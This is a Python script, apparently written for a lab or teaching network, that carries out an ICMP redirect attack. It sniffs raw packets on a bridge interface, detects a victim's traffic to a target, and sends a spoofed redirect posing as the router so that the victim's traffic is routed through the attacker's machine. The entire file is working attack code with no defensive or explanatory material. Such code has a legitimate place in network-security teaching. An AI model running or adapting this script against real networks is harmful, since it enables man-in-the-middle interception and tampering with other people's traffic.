#!/usr/bin/env python3
"""
ICMP Redirect Attack Implementation
This script demonstrates an ICMP redirect attack by crafting raw packets.
"""

import socket
import struct
import time
import threading
import select
from util import PacketCrafter, NetworkConfig, parse_ip_header, format_ip_address

class ICMPRedirectAttacker:
    """Main ICMP Redirect Attack class"""
    
    def __init__(self):
        self.running = False
        self.packet_crafter = PacketCrafter()
        
    def sniff_packets(self):
        """Sniff packets to detect victim's traffic to target"""
        try:
            # Create raw socket for sniffing
            sniffer = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))
            sniffer.bind(("br-icmpnet", 0))  # Bind to bridge interface
            
            print(f"[*] Starting packet sniffing on bridge interface...")
            
            while self.running:
                ready = select.select([sniffer], [], [], 1.0)
                if ready[0]:
                    packet, addr = sniffer.recvfrom(65535)
                    self.analyze_packet(packet)
                    
        except PermissionError:
            print("[!] Permission denied. Run as root or with CAP_NET_RAW capability")
        except Exception as e:
            print(f"[!] Sniffing error: {e}")
        finally:
            sniffer.close()

    def analyze_packet(self, packet):
        """Analyze captured packet for attack opportunities"""
        try:
            # Parse Ethernet header (14 bytes)
            eth_header = packet[:14]
            eth_type = struct.unpack('!H', eth_header[12:14])[0]
            
            # Check if it's an IP packet
            if eth_type == 0x0800:
                ip_packet = packet[14:]
                self.process_ip_packet(ip_packet)
                
        except Exception as e:
            print(f"[!] Packet analysis error: {e}")

    def process_ip_packet(self, ip_packet):
        """Process IP packet and check for attack opportunity"""
        try:
            # Parse IP header using utility function
            ip_info = parse_ip_header(ip_packet)
            
            # Check if victim is trying to reach target
            if ip_info['source_ip'] == NetworkConfig.VICTIM_IP and ip_info['destination_ip'] == NetworkConfig.TARGET_IP:
                print(f"[+] Detected victim ({NetworkConfig.VICTIM_IP}) communicating with target ({NetworkConfig.TARGET_IP})")
                self.launch_redirect_attack(ip_info['header_bytes'], ip_packet[20:])
                
        except Exception as e:
            print(f"[!] IP packet processing error: {e}")

    def launch_redirect_attack(self, original_ip_header, original_payload):
        """Launch ICMP redirect attack"""
        try:
            print(f"[*] Launching ICMP redirect attack...")
            
            # Create ICMP redirect packet using utility function
            icmp_redirect = self.packet_crafter.create_icmp_redirect_packet(
                NetworkConfig.ATTACKER_IP,  # Redirect to attacker as new gateway
                original_ip_header,
                original_payload
            )
            
            # Create IP header for redirect packet (router -> victim)
            ip_header = self.packet_crafter.create_ip_header(
                NetworkConfig.ROUTER_IP,    # Spoof as legitimate router
                NetworkConfig.VICTIM_IP,    # Send to victim
                NetworkConfig.IPPROTO_ICMP, # ICMP protocol
                len(icmp_redirect)
            )
            
            # Combine headers and payload
            redirect_packet = ip_header + icmp_redirect
            
            # Send spoofed redirect packet
            self.packet_crafter.send_raw_packet(redirect_packet, NetworkConfig.VICTIM_IP)
            
            print(f"[+] ICMP redirect sent: {NetworkConfig.ROUTER_IP} -> {NetworkConfig.VICTIM_IP}")
            print(f"[+] Redirecting traffic to attacker: {NetworkConfig.ATTACKER_IP}")
            
        except Exception as e:
            print(f"[!] Redirect attack error: {e}")

    def send_spoofed_packet(self, packet, target_ip):
        """Send spoofed packet using raw socket"""
        try:
            self.packet_crafter.send_raw_packet(packet, target_ip)
        except Exception as e:
            print(f"[!] Packet sending error: {e}")

    def start_attack(self):
        """Start the ICMP redirect attack"""
        print("="*60)
        print("ICMP Redirect Attack Demonstration")
        print("="*60)
        print(f"Victim IP: {NetworkConfig.VICTIM_IP}")
        print(f"Router IP: {NetworkConfig.ROUTER_IP}")
        print(f"Attacker IP: {NetworkConfig.ATTACKER_IP}")
        print(f"Target IP: {NetworkConfig.TARGET_IP}")
        print("="*60)
        
        self.running = True
        
        # Start packet sniffing in separate thread
        sniffer_thread = threading.Thread(target=self.sniff_packets)
        sniffer_thread.daemon = True
        sniffer_thread.start()
        
        try:
            print("[*] Attack started. Press Ctrl+C to stop...")
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[*] Stopping attack...")
            self.running = False

    def manual_redirect(self):
        """Send manual ICMP redirect (for testing)"""
        print("[*] Sending manual ICMP redirect...")
        
        # Create fake original packet (victim -> target)
        fake_ip_header = self.packet_crafter.create_ip_header(
            NetworkConfig.VICTIM_IP, NetworkConfig.TARGET_IP, NetworkConfig.IPPROTO_ICMP, 8
        )
        fake_payload = b'\x08\x00\xf7\xff\x00\x00\x00\x00'  # ICMP echo request
        
        self.launch_redirect_attack(fake_ip_header, fake_payload)

def main():
    """Main function"""
    import sys
    
    if len(sys.argv) > 1 and sys.argv[1] == "--manual":
        # Manual mode for testing
        attacker = ICMPRedirectAttacker()
        attacker.manual_redirect()
    else:
        # Automatic sniffing mode
        attacker = ICMPRedirectAttacker()
        attacker.start_attack()

if __name__ == "__main__":
    main()
